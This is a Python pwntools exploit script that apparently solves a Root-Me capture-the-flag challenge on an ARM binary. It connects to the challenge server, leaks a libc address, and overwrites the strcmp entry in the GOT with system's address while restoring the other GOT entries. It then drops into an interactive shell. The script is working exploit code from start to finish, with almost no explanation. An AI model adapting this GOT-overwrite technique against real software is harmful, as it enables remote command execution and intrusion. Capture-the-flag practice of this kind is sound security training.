#!/usr/bin/python


# file code
# set architecture arm
# target remote 127.0.0.1:1234

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./code


from pwn import *
import binascii


target = '11111111111111111111111111111111111111111111111111111111111'
system_offset = 166352
offsets = [0xb6ea2151-0xb6e91e05, 0xb6ea2151-0xb6e9f715, 0xb6ea2151-0xb6e92075, 0xb6ea2151-0xb6ea8680] #Pour conserver une GOT propre

tmp = open('exploit', 'rb').readlines()
commands = []
for i in tmp:
    if len(i) > 0:
        commands.append(i)

r = remote('challenge04.root-me.org', 61047)
# r = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './code'])
# r = remote('localhost', 1234)


r.recvuntil(':')
print(r.recvuntil(':'))

for c in commands:
    c = c.replace('\n','')
    if target in c:
        c = c[:4*(len(c)//4)]+"\x0c\x30\x02" #adresse de strcmp dans la GOT qu'on va remplacer par celle de system
    print(c)
    r.sendline(c)
    tmp = r.recvuntil(':')
    print(tmp)
    print_details = False
    answer = False
    result = None
    if 'Details:' in tmp:
        print_details = True
    while 'Command' in tmp or 'Success:' in tmp or 'added' in tmp or 'name:' in tmp or 'alias:' in tmp or 'Details:' in tmp or 'Index:' in tmp or (print_details and ('Team' in tmp or 'Desc:' in tmp or 'Score:' in tmp)):
        tmp = r.recvuntil(':')
        if answer:
            answer = False
            result = tmp
        print(tmp)
        if 'Details:' in tmp:
            print_details = True
        if print_details and 'Desc:' in tmp:
            answer = True

    if result is not None:
        print(binascii.hexlify(result))
        leak = u32(result[2:6])
        system = leak-system_offset
        print(hex(leak))
        print(hex(system))
        r.sendline("edit ppp")
        print(r.recvuntil(':'))
        r.sendline("kikoo")
        print(r.recvuntil(':'))
        payload = p32(system)+''.join([p32(leak-i) for i in offsets])
        print(binascii.hexlify(payload))
        r.sendline(payload)
        print(r.recvuntil(':'))
        r.sendline("10")
        print(r.recvuntil(':'))
        print(r.recvuntil(':'))
        r.sendline("show ppp")
        r.interactive()
